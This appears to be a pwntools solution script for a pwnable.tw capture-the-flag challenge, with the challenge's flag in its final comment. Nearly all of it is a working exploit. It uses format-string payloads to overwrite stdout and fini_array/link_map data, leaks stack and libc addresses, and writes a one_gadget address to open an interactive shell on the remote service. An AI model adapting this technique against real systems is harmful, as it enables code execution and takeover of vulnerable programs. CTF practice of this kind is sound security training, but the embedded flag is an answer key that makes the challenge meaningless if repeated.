from pwn import *
import time



while True :
    try :
        r = remote('chall.pwnable.tw',10307)
        #r = process('./P',env={"LD_PRELOAD" : "./libc_64.so.6"})
        #context(os="linux",arch="amd64",log_level='debug')

        stdout = 0x601020
        fini_array = 0x600db8
        bss_start = 0x601000
        shift_offset = bss_start-fini_array
        ### overwrite stdout to stderr with 1/16 probability 
        fmt = f'%{0x25}c%15$hhn%{0x40-0x25}c%16$hhn'

        ### overwrite bss to main function and overwrite l->l_addr
        fmt += f'%17$hhn' # 0x40
        fmt += f'%{shift_offset - 0x40 }c%42$hn'
        fmt += f'%{0x090c - shift_offset}c%18$hn'

        ### 

        payload = fmt.encode().ljust(0x48,b'\x00') + p64(stdout+1) + p64(stdout) + p64(bss_start+2) + p64(bss_start)
        r.sendafter(b'Input :',payload)
        a = r.recv(7,timeout=0.1)
        if b'I' not in a:
            raise
        break
    except :
        pass
        r.close()

### leak and ret2main
leak_payload = b'%p %p %p '
write_payload = f'%{0x4008f3 - 35}c%23$n'.encode()
r.send(leak_payload + write_payload)
time.sleep(1)

stack = int(r.recvuntil(b' ',drop=True),16)
print(f'stack : {hex(stack)} ')
r.recvuntil(b' ',drop=True)
libc = int(r.recvuntil(b' ',drop=True),16) - 0xf6680
print(f'libc : {hex(libc)} ')

### write one_gadget 
one_gadget = libc + 0xf0567
gadget1 = one_gadget >> 32
gadget2 = (one_gadget & 0xffff0000) >> 16
gadget3 = one_gadget & 0xffff

dic = {gadget1 : 4, gadget2 : 2, gadget3 : 0}
e = sorted(dic.keys())
payload = f'%{e[0]}c%21$hn%{e[1] - e[0]}c%22$hn%{e[2] - e[1]}c%23$hn'.encode().ljust(0x40,b'\x00') 
payload += p64(stack - 0x40 + dic[e[0]]) + p64(stack - 0x40 + dic[e[1]]) + p64(stack - 0x40 + dic[e[2]])
r.send(payload)
r.interactive()
# FLAG{FILE_str34m_1s_pr1nt4bl3}